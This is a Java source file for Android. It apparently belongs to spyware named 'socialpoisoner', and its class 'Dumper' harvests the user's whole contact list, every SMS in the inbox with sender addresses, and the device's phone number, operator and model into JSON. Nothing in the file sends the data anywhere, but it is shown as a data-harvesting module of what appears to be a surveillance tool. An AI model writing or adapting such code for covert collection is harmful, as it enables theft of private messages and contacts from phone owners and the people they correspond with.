package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Properties;

/**
 * Created by doctorrabb on 15.07.16.
 */
public class Dumper {

    public JSONArray dumpContacts (Context context) {

        JSONArray jsonArray = new JSONArray ();

        if (ActivityCompat.checkSelfPermission (context, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cur = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME));

                    if (cur.getInt(cur.getColumnIndex(
                            ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor pCur = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (pCur.moveToNext()) {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));

                            try {
                                jsonArray.put(new JSONObject().put("name", name).put("num", phoneNo));
                            } catch (JSONException e) {
                                Log.e("Get Contatcts Error", e.getMessage());
                            }

                        }
                        pCur.close();
                    }
                }
            }

            return jsonArray;
        }
        return null;
    }

    public JSONArray dumpSMS (Context context) {

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            JSONArray jsonObject = new JSONArray();
            cursor.moveToFirst();

            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex("body")).toString();
                String address = cursor.getString(cursor.getColumnIndex("address")).toString();

                try {
                    jsonObject.put(new JSONObject().put("body", body).put("address", address));
                } catch (JSONException e) {
                    return null;
                }
            }

            cursor.close();

            Log.d ("SMS JSON List", jsonObject.toString());

            return jsonObject;

        }
        return null;
    }

    public JSONObject dumpInfo (Context context) {
        JSONObject properties = new JSONObject ();
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        try {
            properties.put("phone_number", telephonyManager.getLine1Number());
            properties.put("mobile_operator", telephonyManager.getNetworkOperatorName());

            properties.put("device_model", Build.MODEL);
            properties.put("android_version", Build.VERSION.RELEASE);
            properties.put("android_version_codename", Build.VERSION.CODENAME);
        } catch (Exception e) {
            Log.e ("Get Information Error", e.getMessage());
        }

        return properties;

    }

}
